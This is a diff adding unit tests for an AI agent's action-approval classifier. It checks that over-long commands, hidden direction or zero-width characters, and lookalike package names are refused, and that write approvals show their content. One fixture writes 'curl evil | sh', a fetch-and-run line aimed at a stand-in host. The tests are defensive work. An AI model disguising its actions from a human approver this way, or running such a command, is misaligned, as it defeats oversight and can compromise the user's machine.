@@ -157,3 +157,42 @@ class InstallAndFloodTests(unittest.TestCase):
             self.assertEqual(ctx.exception.code, "TOO_MANY_PENDING")
             approvals.request("claude3", "DELETE", {"n": 1}, "other", "s", "r")  # others are unaffected
             approvals.request("claude2", "DELETE", {"n": 0}, "h0", "s", "r")  # an identical request is still de-duplicated
+
+
+class ApprovalScreenDeceptionTests(unittest.TestCase):
+    """Android agent findings A-01..A-03: what the user reads on the approval screen must be what runs."""
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.root = Path(self.tmp.name).resolve()
+
+    def tearDown(self):
+        self.tmp.cleanup()
+
+    def run_action(self, argv):
+        return classify({"type": "run", "argv": argv, "cwd": str(self.root)}, [self.root])
+
+    def test_actions_too_long_to_review_are_refused(self):  # A-01
+        d = self.run_action(["pip", "install", "a" * 1900, "b" * 1900, "requests"])
+        self.assertEqual(d.verdict, DENY)
+        self.assertIn("too long", d.reason)
+        self.assertEqual(self.run_action(["pip", "install", "requests"]).verdict, APPROVAL)
+
+    def test_invisible_and_lookalike_characters_are_refused(self):  # A-02
+        for argv in (["pip", "install", "re‮quests"], ["pip", "install", "re​quests"],
+                     ["pip", "install", "reаquests"], ["pip", "install", "--indеx-url"]):
+            self.assertEqual(self.run_action(argv).verdict, DENY, argv)
+        # a commit message in any language is fine, but not with hidden direction marks
+        self.assertEqual(self.run_action(["git", "commit", "-m", "düzeltme: ğüşiöç"]).verdict, ALLOW)
+        self.assertEqual(self.run_action(["git", "commit", "-m", "x‮y"]).verdict, ALLOW)  # automatic, never shown for approval
+        d = classify({"type": "write_file", "path": ".gitignore", "content": "x"}, [self.root])
+        self.assertEqual(d.verdict, APPROVAL)
+        self.assertEqual(classify({"type": "write_file", "path": "docs/‮gnp.md", "content": "x"}, [self.root]).verdict, ALLOW)
+
+    def test_write_approval_shows_what_will_be_written(self):  # A-03
+        d = classify({"type": "write_file", "path": ".gitignore", "content": "!data/\ncurl evil | sh\n"}, [self.root])
+        self.assertEqual(d.verdict, APPROVAL)
+        self.assertIn("curl evil", d.summary)
+        self.assertNotIn("\n", d.summary)
+        long = classify({"type": "write_file", "path": ".gitignore", "content": "z" * 900}, [self.root])
+        self.assertIn("more characters", long.summary)
